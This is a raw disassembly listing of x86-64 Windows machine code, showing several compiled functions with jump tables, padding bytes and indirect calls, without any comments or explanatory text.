   140004b7e:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   140004b83:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140004b88:	ff 15 32 79 02 00    	call   *0x27932(%rip)        # 0x14002c4c0
   140004b8e:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004b93:	f7 d8                	neg    %eax
   140004b95:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004b99:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004b9d:	1b c0                	sbb    %eax,%eax
   140004b9f:	49 8b e3             	mov    %r11,%rsp
   140004ba2:	5f                   	pop    %rdi
   140004ba3:	c3                   	ret
   140004ba4:	cc                   	int3
   140004ba5:	cc                   	int3
   140004ba6:	cc                   	int3
   140004ba7:	cc                   	int3
   140004ba8:	cc                   	int3
   140004ba9:	cc                   	int3
   140004baa:	cc                   	int3
   140004bab:	cc                   	int3
   140004bac:	cc                   	int3
   140004bad:	cc                   	int3
   140004bae:	cc                   	int3
   140004baf:	cc                   	int3
   140004bb0:	48 8b 81 10 20 00 00 	mov    0x2010(%rcx),%rax
   140004bb7:	8b 90 28 10 00 00    	mov    0x1028(%rax),%edx
   140004bbd:	0f b6 81 79 30 00 00 	movzbl 0x3079(%rcx),%eax
   140004bc4:	03 d2                	add    %edx,%edx
   140004bc6:	0b d0                	or     %eax,%edx
   140004bc8:	81 c2 98 fd ff ff    	add    $0xfffffd98,%edx
   140004bce:	83 fa 0b             	cmp    $0xb,%edx
   140004bd1:	77 61                	ja     0x140004c34
   140004bd3:	48 63 c2             	movslq %edx,%rax
   140004bd6:	48 8d 15 23 b4 ff ff 	lea    -0x4bdd(%rip),%rdx        # 0x140000000
   140004bdd:	8b 8c 82 38 4c 00 00 	mov    0x4c38(%rdx,%rax,4),%ecx
   140004be4:	48 03 ca             	add    %rdx,%rcx
   140004be7:	ff e1                	jmp    *%rcx
   140004be9:	ba 68 01 00 00       	mov    $0x168,%edx
   140004bee:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004bf3:	e9 f8 05 01 00       	jmp    0x1400151f0
   140004bf8:	ba 88 01 00 00       	mov    $0x188,%edx
   140004bfd:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c02:	e9 e9 05 01 00       	jmp    0x1400151f0
   140004c07:	ba 90 01 00 00       	mov    $0x190,%edx
   140004c0c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c11:	e9 da 05 01 00       	jmp    0x1400151f0
   140004c16:	ba b0 01 00 00       	mov    $0x1b0,%edx
   140004c1b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c20:	e9 cb 05 01 00       	jmp    0x1400151f0
   140004c25:	ba c8 01 00 00       	mov    $0x1c8,%edx
   140004c2a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c2f:	e9 bc 05 01 00       	jmp    0x1400151f0
   140004c34:	33 c0                	xor    %eax,%eax
   140004c36:	c3                   	ret
   140004c37:	90                   	nop
   140004c38:	e9 4b 00 00 34       	jmp    0x174004c88
   140004c3d:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c40:	f8                   	clc
   140004c41:	4b 00 00             	rex.WXB add %al,(%r8)
   140004c44:	34 4c                	xor    $0x4c,%al
   140004c46:	00 00                	add    %al,(%rax)
   140004c48:	07                   	(bad)
   140004c49:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c4c:	34 4c                	xor    $0x4c,%al
   140004c4e:	00 00                	add    %al,(%rax)
   140004c50:	16                   	(bad)
   140004c51:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c54:	34 4c                	xor    $0x4c,%al
   140004c56:	00 00                	add    %al,(%rax)
   140004c58:	16                   	(bad)
   140004c59:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c5c:	34 4c                	xor    $0x4c,%al
   140004c5e:	00 00                	add    %al,(%rax)
   140004c60:	25 4c 00 00 25       	and    $0x2500004c,%eax
   140004c65:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c68:	cc                   	int3
   140004c69:	cc                   	int3
   140004c6a:	cc                   	int3
   140004c6b:	cc                   	int3
   140004c6c:	cc                   	int3
   140004c6d:	cc                   	int3
   140004c6e:	cc                   	int3
   140004c6f:	cc                   	int3
   140004c70:	48 85 c9             	test   %rcx,%rcx
   140004c73:	74 22                	je     0x140004c97
   140004c75:	53                   	push   %rbx
   140004c76:	48 83 ec 20          	sub    $0x20,%rsp
   140004c7a:	48 8b 05 47 e1 03 00 	mov    0x3e147(%rip),%rax        # 0x140042dc8
   140004c81:	48 8b d9             	mov    %rcx,%rbx
   140004c84:	ff 15 36 78 02 00    	call   *0x27836(%rip)        # 0x14002c4c0
   140004c8a:	48 8b cb             	mov    %rbx,%rcx
   140004c8d:	e8 6e 05 01 00       	call   0x140015200
   140004c92:	48 83 c4 20          	add    $0x20,%rsp
   140004c96:	5b                   	pop    %rbx
   140004c97:	c3                   	ret
   140004c98:	cc                   	int3
   140004c99:	cc                   	int3
   140004c9a:	cc                   	int3
   140004c9b:	cc                   	int3
   140004c9c:	cc                   	int3
   140004c9d:	cc                   	int3
   140004c9e:	cc                   	int3
   140004c9f:	cc                   	int3
   140004ca0:	40 53                	rex push %rbx
   140004ca2:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140004ca9:	48 8b 05 90 a3 03 00 	mov    0x3a390(%rip),%rax        # 0x14003f040
   140004cb0:	48 33 c4             	xor    %rsp,%rax
   140004cb3:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140004cba:	00 
   140004cbb:	48 8b 05 c6 e1 03 00 	mov    0x3e1c6(%rip),%rax        # 0x140042e88
   140004cc2:	48 8b d9             	mov    %rcx,%rbx
   140004cc5:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004cca:	ff 15 f0 77 02 00    	call   *0x277f0(%rip)        # 0x14002c4c0
   140004cd0:	8b 43 14             	mov    0x14(%rbx),%eax
   140004cd3:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004cd8:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140004cdf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004ce4:	8b 43 18             	mov    0x18(%rbx),%eax
   140004ce7:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140004cee:	48 8b 05 cb e0 03 00 	mov    0x3e0cb(%rip),%rax        # 0x140042dc0
   140004cf5:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140004cfc:	00 
   140004cfd:	ff 15 bd 77 02 00    	call   *0x277bd(%rip)        # 0x14002c4c0
   140004d03:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004d08:	0f 10 00             	movups (%rax),%xmm0
   140004d0b:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004d0f:	48 8b 05 82 e1 03 00 	mov    0x3e182(%rip),%rax        # 0x140042e98
   140004d16:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   140004d1b:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   140004d20:	ff 15 9a 77 02 00    	call   *0x2779a(%rip)        # 0x14002c4c0
   140004d26:	f7 d8                	neg    %eax
   140004d28:	1b c0                	sbb    %eax,%eax
   140004d2a:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140004d31:	00 
   140004d32:	48 33 cc             	xor    %rsp,%rcx
   140004d35:	e8 96 78 00 00       	call   0x14000c5d0
   140004d3a:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140004d41:	5b                   	pop    %rbx
   140004d42:	c3                   	ret
   140004d43:	cc                   	int3
   140004d44:	cc                   	int3
   140004d45:	cc                   	int3
   140004d46:	cc                   	int3
   140004d47:	cc                   	int3
   140004d48:	cc                   	int3
   140004d49:	cc                   	int3
   140004d4a:	cc                   	int3
   140004d4b:	cc                   	int3
   140004d4c:	cc                   	int3
   140004d4d:	cc                   	int3
   140004d4e:	cc                   	int3
   140004d4f:	cc                   	int3
   140004d50:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   140004d54:	44 8b 02             	mov    (%rdx),%r8d
   140004d57:	e9 f4 fa ff ff       	jmp    0x140004850
   140004d5c:	cc                   	int3
   140004d5d:	cc                   	int3
   140004d5e:	cc                   	int3
   140004d5f:	cc                   	int3
   140004d60:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004d65:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004d6a:	57                   	push   %rdi
   140004d6b:	b8 80 20 00 00       	mov    $0x2080,%eax
   140004d70:	e8 5b 7b 00 00       	call   0x14000c8d0
   140004d75:	48 2b e0             	sub    %rax,%rsp
   140004d78:	48 8b 05 c1 a2 03 00 	mov    0x3a2c1(%rip),%rax        # 0x14003f040
   140004d7f:	48 33 c4             	xor    %rsp,%rax
   140004d82:	48 89 84 24 70 20 00 	mov    %rax,0x2070(%rsp)
   140004d89:	00 
   140004d8a:	48 8d 05 af 89 02 00 	lea    0x289af(%rip),%rax        # 0x14002d740
   140004d91:	48 8b fa             	mov    %rdx,%rdi
   140004d94:	48 8b f1             	mov    %rcx,%rsi
   140004d97:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004d9c:	4c 8d 8a 22 20 00 00 	lea    0x2022(%rdx),%r9
   140004da3:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004daa:	00 
   140004dab:	4c 8d 05 c2 7f 02 00 	lea    0x27fc2(%rip),%r8        # 0x14002cd74
   140004db2:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004db7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004dbc:	e8 bf ce ff ff       	call   0x140001c80
   140004dc1:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004dc6:	0f 8d ad 00 00 00    	jge    0x140004e79
   140004dcc:	48 8d 05 85 89 02 00 	lea    0x28985(%rip),%rax        # 0x14002d758
   140004dd3:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004dd8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004ddd:	4c 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%r9
   140004de4:	4c 8d 05 89 7f 02 00 	lea    0x27f89(%rip),%r8        # 0x14002cd74
   140004deb:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004df2:	00 
   140004df3:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140004dfa:	00 
   140004dfb:	e8 80 ce ff ff       	call   0x140001c80
   140004e00:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004e05:	7d 72                	jge    0x140004e79
   140004e07:	45 33 c0             	xor    %r8d,%r8d
   140004e0a:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004e0f:	33 d2                	xor    %edx,%edx
   140004e11:	e8 fa 45 00 00       	call   0x140009410
   140004e16:	45 33 c0             	xor    %r8d,%r8d
   140004e19:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004e1e:	33 d2                	xor    %edx,%edx
   140004e20:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140004e27:	00 
   140004e28:	e8 e3 45 00 00       	call   0x140009410
   140004e2d:	45 33 c0             	xor    %r8d,%r8d
   140004e30:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004e35:	33 d2                	xor    %edx,%edx
   140004e37:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140004e3e:	e8 cd 45 00 00       	call   0x140009410
   140004e43:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004e48:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004e4d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004e53:	48 8b d7             	mov    %rdi,%rdx
   140004e56:	48 8b ce             	mov    %rsi,%rcx
   140004e59:	e8 f2 fa ff ff       	call   0x140004950
   140004e5e:	8b f8                	mov    %eax,%edi
   140004e60:	33 db                	xor    %ebx,%ebx
   140004e62:	48 8b 4c dc 30       	mov    0x30(%rsp,%rbx,8),%rcx
   140004e67:	e8 94 03 01 00       	call   0x140015200
   140004e6c:	48 ff c3             	inc    %rbx
   140004e6f:	48 83 fb 03          	cmp    $0x3,%rbx
   140004e73:	7c ed                	jl     0x140004e62
   140004e75:	8b c7                	mov    %edi,%eax
   140004e77:	eb 05                	jmp    0x140004e7e
   140004e79:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004e7e:	48 8b 8c 24 70 20 00 	mov    0x2070(%rsp),%rcx
   140004e85:	00 
   140004e86:	48 33 cc             	xor    %rsp,%rcx
   140004e89:	e8 42 77 00 00       	call   0x14000c5d0
   140004e8e:	4c 8d 9c 24 80 20 00 	lea    0x2080(%rsp),%r11
   140004e95:	00 
   140004e96:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140004e9a:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140004e9e:	49 8b e3             	mov    %r11,%rsp
   140004ea1:	5f                   	pop    %rdi
   140004ea2:	c3                   	ret
   140004ea3:	cc                   	int3
   140004ea4:	cc                   	int3
   140004ea5:	cc                   	int3
   140004ea6:	cc                   	int3
   140004ea7:	cc                   	int3
   140004ea8:	cc                   	int3
   140004ea9:	cc                   	int3
   140004eaa:	cc                   	int3
   140004eab:	cc                   	int3
   140004eac:	cc                   	int3
   140004ead:	cc                   	int3
   140004eae:	cc                   	int3
   140004eaf:	cc                   	int3
   140004eb0:	48 83 ec 28          	sub    $0x28,%rsp
   140004eb4:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004ebb:	4c 8b ca             	mov    %rdx,%r9
   140004ebe:	44 8b 80 28 10 00 00 	mov    0x1028(%rax),%r8d
   140004ec5:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004ecc:	45 03 c0             	add    %r8d,%r8d
   140004ecf:	44 0b c0             	or     %eax,%r8d
   140004ed2:	41 81 c0 98 fd ff ff 	add    $0xfffffd98,%r8d
   140004ed9:	41 83 f8 0b          	cmp    $0xb,%r8d
   140004edd:	77 4a                	ja     0x140004f29
   140004edf:	49 63 c0             	movslq %r8d,%rax
   140004ee2:	4c 8d 05 17 b1 ff ff 	lea    -0x4ee9(%rip),%r8        # 0x140000000
   140004ee9:	41 8b 94 80 34 4f 00 	mov    0x4f34(%r8,%rax,4),%edx
   140004ef0:	00 
   140004ef1:	49 03 d0             	add    %r8,%rdx
   140004ef4:	ff e2                	jmp    *%rdx
   140004ef6:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140004efa:	eb 19                	jmp    0x140004f15
   140004efc:	48 8d 91 f8 00 00 00 	lea    0xf8(%rcx),%rdx
   140004f03:	eb 10                	jmp    0x140004f15
   140004f05:	48 8d 91 10 01 00 00 	lea    0x110(%rcx),%rdx
   140004f0c:	eb 07                	jmp    0x140004f15
   140004f0e:	48 8d 91 18 01 00 00 	lea    0x118(%rcx),%rdx
   140004f15:	4d 8d 41 10          	lea    0x10(%r9),%r8
   140004f19:	e8 d2 fb ff ff       	call   0x140004af0
   140004f1e:	85 c0                	test   %eax,%eax
   140004f20:	78 07                	js     0x140004f29
   140004f22:	33 c0                	xor    %eax,%eax
   140004f24:	48 83 c4 28          	add    $0x28,%rsp
   140004f28:	c3                   	ret
   140004f29:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004f2e:	48 83 c4 28          	add    $0x28,%rsp
   140004f32:	c3                   	ret
   140004f33:	90                   	nop
   140004f34:	f6 4e 00 00          	testb  $0x0,0x0(%rsi)
   140004f38:	29 4f 00             	sub    %ecx,0x0(%rdi)
   140004f3b:	00 f6                	add    %dh,%dh
   140004f3d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f40:	29 4f 00             	sub    %ecx,0x0(%rdi)
   140004f43:	00 fc                	add    %bh,%ah
   140004f45:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f48:	29 4f 00             	sub    %ecx,0x0(%rdi)
   140004f4b:	00 05 4f 00 00 29    	add    %al,0x2900004f(%rip)        # 0x169004fa0
   140004f51:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004f54:	05 4f 00 00 29       	add    $0x2900004f,%eax
   140004f59:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004f5c:	0e                   	(bad)
   140004f5d:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004f60:	0e                   	(bad)
   140004f61:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004f64:	cc                   	int3
   140004f65:	cc                   	int3
   140004f66:	cc                   	int3
   140004f67:	cc                   	int3
   140004f68:	cc                   	int3
   140004f69:	cc                   	int3
   140004f6a:	cc                   	int3
   140004f6b:	cc                   	int3
   140004f6c:	cc                   	int3
   140004f6d:	cc                   	int3
   140004f6e:	cc                   	int3
   140004f6f:	cc                   	int3
   140004f70:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004f77:	4c 8b ca             	mov    %rdx,%r9
   140004f7a:	44 8b 80 28 10 00 00 	mov    0x1028(%rax),%r8d
   140004f81:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004f88:	45 03 c0             	add    %r8d,%r8d
   140004f8b:	44 0b c0             	or     %eax,%r8d
   140004f8e:	41 81 c0 98 fd ff ff 	add    $0xfffffd98,%r8d
   140004f95:	41 83 f8 0b          	cmp    $0xb,%r8d
   140004f99:	77 63                	ja     0x140004ffe
   140004f9b:	49 63 c0             	movslq %r8d,%rax
   140004f9e:	4c 8d 05 5b b0 ff ff 	lea    -0x4fa5(%rip),%r8        # 0x140000000
   140004fa5:	41 8b 94 80 04 50 00 	mov    0x5004(%r8,%rax,4),%edx
   140004fac:	00 
   140004fad:	49 03 d0             	add    %r8,%rdx
   140004fb0:	ff e2                	jmp    *%rdx
   140004fb2:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fb9:	48 8d 91 f0 00 00 00 	lea    0xf0(%rcx),%rdx
   140004fc0:	e9 2b fb ff ff       	jmp    0x140004af0
   140004fc5:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fcc:	48 8d 91 08 01 00 00 	lea    0x108(%rcx),%rdx
   140004fd3:	e9 18 fb ff ff       	jmp    0x140004af0
   140004fd8:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fdf:	48 8d 91 20 01 00 00 	lea    0x120(%rcx),%rdx
   140004fe6:	e9 05 fb ff ff       	jmp    0x140004af0
   140004feb:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004ff2:	48 8d 91 28 01 00 00 	lea    0x128(%rcx),%rdx
   140004ff9:	e9 f2 fa ff ff       	jmp    0x140004af0
   140004ffe:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005003:	c3                   	ret
   140005004:	b2 4f                	mov    $0x4f,%dl
   140005006:	00 00                	add    %al,(%rax)
   140005008:	fe 4f 00             	decb   0x0(%rdi)
   14000500b:	00 b2 4f 00 00 fe    	add    %dh,-0x1ffffb1(%rdx)
   140005011:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005014:	c5 4f 00             	(bad)
   140005017:	00 fe                	add    %bh,%dh
   140005019:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000501c:	d8 4f 00             	fmuls  0x0(%rdi)
   14000501f:	00 fe                	add    %bh,%dh
   140005021:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005024:	d8 4f 00             	fmuls  0x0(%rdi)
   140005027:	00 fe                	add    %bh,%dh
   140005029:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000502c:	eb 4f                	jmp    0x14000507d
   14000502e:	00 00                	add    %al,(%rax)
   140005030:	eb 4f                	jmp    0x140005081
   140005032:	00 00                	add    %al,(%rax)
   140005034:	cc                   	int3
   140005035:	cc                   	int3
   140005036:	cc                   	int3
   140005037:	cc                   	int3
   140005038:	cc                   	int3
   140005039:	cc                   	int3
   14000503a:	cc                   	int3
   14000503b:	cc                   	int3
   14000503c:	cc                   	int3
   14000503d:	cc                   	int3
   14000503e:	cc                   	int3
   14000503f:	cc                   	int3
   140005040:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005045:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000504a:	55                   	push   %rbp
   14000504b:	48 8b ec             	mov    %rsp,%rbp
   14000504e:	48 83 ec 70          	sub    $0x70,%rsp
   140005052:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140005059:	49 8b f8             	mov    %r8,%rdi
   14000505c:	48 8b d9             	mov    %rcx,%rbx
   14000505f:	44 8b 88 28 10 00 00 	mov    0x1028(%rax),%r9d
   140005066:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   14000506d:	45 03 c9             	add    %r9d,%r9d
   140005070:	44 0b c8             	or     %eax,%r9d
   140005073:	41 81 c1 98 fd ff ff 	add    $0xfffffd98,%r9d
   14000507a:	41 83 f9 0b          	cmp    $0xb,%r9d
   14000507e:	0f 87 96 02 00 00    	ja     0x14000531a
   140005084:	48 8d 15 75 af ff ff 	lea    -0x508b(%rip),%rdx        # 0x140000000
   14000508b:	49 63 c1             	movslq %r9d,%rax
   14000508e:	8b 8c 82 34 53 00 00 	mov    0x5334(%rdx,%rax,4),%ecx
   140005095:	48 03 ca             	add    %rdx,%rcx
   140005098:	ff e1                	jmp    *%rcx
   14000509a:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   1400050a1:	00 00 00 
   1400050a4:	33 c9                	xor    %ecx,%ecx
   1400050a6:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   1400050ac:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   1400050b2:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400050b6:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   1400050bc:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   1400050c0:	0f 94 c1             	sete   %cl
   1400050c3:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   1400050c9:	41 8b 00             	mov    (%r8),%eax
   1400050cc:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   1400050d2:	41 8b 40 0c          	mov    0xc(%r8),%eax
   1400050d6:	89 43 14             	mov    %eax,0x14(%rbx)
   1400050d9:	41 8b 40 10          	mov    0x10(%r8),%eax
   1400050dd:	89 43 18             	mov    %eax,0x18(%rbx)
   1400050e0:	41 8b 40 18          	mov    0x18(%r8),%eax
   1400050e4:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400050e7:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   1400050eb:	85 c0                	test   %eax,%eax
   1400050ed:	74 4f                	je     0x14000513e
   1400050ef:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   1400050f3:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   1400050fa:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400050ff:	4c 8b c8             	mov    %rax,%r9
   140005102:	48 8b 05 e7 dc 03 00 	mov    0x3dce7(%rip),%rax        # 0x140042df0
   140005109:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000510d:	48 8b d3             	mov    %rbx,%rdx
   140005110:	ff 15 aa 73 02 00    	call   *0x273aa(%rip)        # 0x14002c4c0
   140005116:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000511a:	0f 10 00             	movups (%rax),%xmm0
   14000511d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005121:	48 8b 05 70 dd 03 00 	mov    0x3dd70(%rip),%rax        # 0x140042e98
   140005128:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000512c:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140005130:	ff 15 8a 73 02 00    	call   *0x2738a(%rip)        # 0x14002c4c0
   140005136:	85 c0                	test   %eax,%eax
   140005138:	0f 85 dc 01 00 00    	jne    0x14000531a
   14000513e:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140005142:	85 c0                	test   %eax,%eax
   140005144:	0f 84 b5 01 00 00    	je     0x1400052ff
   14000514a:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   14000514e:	e9 68 01 00 00       	jmp    0x1400052bb
   140005153:	c7 83 c4 00 00 00 01 	movl   $0x1,0xc4(%rbx)
   14000515a:	00 00 00 
   14000515d:	33 c9                	xor    %ecx,%ecx
   14000515f:	89 8b 98 00 00 00    	mov    %ecx,0x98(%rbx)
   140005165:	89 8b b4 00 00 00    	mov    %ecx,0xb4(%rbx)
   14000516b:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000516f:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140005175:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140005179:	0f 94 c1             	sete   %cl
   14000517c:	89 8b c8 00 00 00    	mov    %ecx,0xc8(%rbx)
   140005182:	41 8b 00             	mov    (%r8),%eax
   140005185:	89 83 b8 00 00 00    	mov    %eax,0xb8(%rbx)
   14000518b:	41 8b 40 0c          	mov    0xc(%r8),%eax
   14000518f:	89 43 14             	mov    %eax,0x14(%rbx)
   140005192:	41 8b 40 10          	mov    0x10(%r8),%eax
   140005196:	89 43 18             	mov    %eax,0x18(%rbx)
   140005199:	41 8b 40 18          	mov    0x18(%r8),%eax
   14000519d:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400051a0:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   1400051a4:	85 c0                	test   %eax,%eax
   1400051a6:	74 4f                	je     0x1400051f7
   1400051a8:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   1400051ac:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   1400051b3:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400051b8:	4c 8b c8             	mov    %rax,%r9
   1400051bb:	48 8b 05 2e dc 03 00 	mov    0x3dc2e(%rip),%rax        # 0x140042df0
   1400051c2:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400051c6:	48 8b d3             	mov    %rbx,%rdx
   1400051c9:	ff 15 f1 72 02 00    	call   *0x272f1(%rip)        # 0x14002c4c0
   1400051cf:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400051d3:	0f 10 00             	movups (%rax),%xmm0
   1400051d6:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400051da:	48 8b 05 b7 dc 03 00 	mov    0x3dcb7(%rip),%rax        # 0x140042e98
   1400051e1:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400051e5:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400051e9:	ff 15 d1 72 02 00    	call   *0x272d1(%rip)        # 0x14002c4c0
   1400051ef:	85 c0                	test   %eax,%eax
   1400051f1:	0f 85 23 01 00 00    	jne    0x14000531a
   1400051f7:	48 63 47 28          	movslq 0x28(%rdi),%rax
   1400051fb:	85 c0                	test   %eax,%eax
   1400051fd:	0f 84 fc 00 00 00    	je     0x1400052ff
   140005203:	4c 8d 43 78          	lea    0x78(%rbx),%r8
   140005207:	e9 af 00 00 00       	jmp    0x1400052bb
   14000520c:	c7 83 d4 00 00 00 01 	movl   $0x1,0xd4(%rbx)
   140005213:	00 00 00 
   140005216:	33 c9                	xor    %ecx,%ecx
   140005218:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   14000521e:	89 8b c4 00 00 00    	mov    %ecx,0xc4(%rbx)
   140005224:	41 8b 40 08          	mov    0x8(%r8),%eax
   140005228:	89 83 bc 00 00 00    	mov    %eax,0xbc(%rbx)
   14000522e:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140005232:	0f 94 c1             	sete   %cl
   140005235:	89 8b d8 00 00 00    	mov    %ecx,0xd8(%rbx)
   14000523b:	41 8b 00             	mov    (%r8),%eax
   14000523e:	89 83 c8 00 00 00    	mov    %eax,0xc8(%rbx)
   140005244:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140005248:	89 43 14             	mov    %eax,0x14(%rbx)
   14000524b:	41 8b 40 10          	mov    0x10(%r8),%eax
   14000524f:	89 43 18             	mov    %eax,0x18(%rbx)
   140005252:	41 8b 40 18          	mov    0x18(%r8),%eax
   140005256:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005259:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   14000525d:	85 c0                	test   %eax,%eax
   14000525f:	74 4b                	je     0x1400052ac
   140005261:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   140005265:	4c 8d 83 98 00 00 00 	lea    0x98(%rbx),%r8
   14000526c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005271:	4c 8b c8             	mov    %rax,%r9
   140005274:	48 8b 05 75 db 03 00 	mov    0x3db75(%rip),%rax        # 0x140042df0
   14000527b:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000527f:	48 8b d3             	mov    %rbx,%rdx
   140005282:	ff 15 38 72 02 00    	call   *0x27238(%rip)        # 0x14002c4c0
   140005288:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000528c:	0f 10 00             	movups (%rax),%xmm0
   14000528f:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005293:	48 8b 05 fe db 03 00 	mov    0x3dbfe(%rip),%rax        # 0x140042e98
   14000529a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000529e:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400052a2:	ff 15 18 72 02 00    	call   *0x27218(%rip)        # 0x14002c4c0
   1400052a8:	85 c0                	test   %eax,%eax
